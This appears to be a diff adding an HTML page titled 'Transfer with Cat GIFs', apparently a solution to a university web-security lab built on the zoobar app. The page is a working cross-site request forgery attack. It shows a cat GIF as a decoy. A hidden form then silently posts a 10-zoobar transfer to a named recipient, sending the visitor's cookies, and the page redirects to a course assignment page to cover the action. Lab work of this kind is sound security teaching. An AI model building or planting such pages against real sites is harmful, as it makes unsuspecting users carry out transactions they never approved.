@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Transfer with Cat GIFs</title>
+    <style>
+        
+        .gif-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+        }
+        
+        #memeCatGif {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="gif-container">
+        <img id="catGif" src="Cat.gif" alt="Cat GIF">
+        <img id="memeCatGif" src="MeMeCat.gif" alt="MeMe Cat GIF">
+    </div>
+
+    <form id="transferform" action="http://localhost:7070/transfer.php" method="POST" style="display: none;">
+        <input type="hidden" name="zoobars" value="10">
+        <input type="hidden" name="recipient" value="Shuuio">
+        <input type="hidden" name="submission" value="Send">
+    </form>
+
+    <script>
+        window.onload = function() {
+            // Obtain DOM elements
+            const catGif = document.getElementById("catGif");
+            const memeCatGif = document.getElementById("memeCatGif");
+            const form = document.getElementById("transferform");
+            const targetUrl = "https://canvas.kth.se/courses/56170/assignments/338609";
+
+            // First, display Cat.gif for at least 1500ms
+            setTimeout(() => {
+                // Build form data
+                const formData = new FormData(form);
+
+                // Send a transfer request
+                fetch(form.action, {
+                    method: form.method,
+                    body: formData,
+                    credentials: "include" 
+                })
+                .then(response => {
+                    if (response.ok) {
+                        catGif.style.display = "none";
+                        memeCatGif.style.display = "block";
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 300);
+                    } else {
+                        window.location.href = targetUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error("Transfer error:", error);
+                    window.location.href = targetUrl;
+                });
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
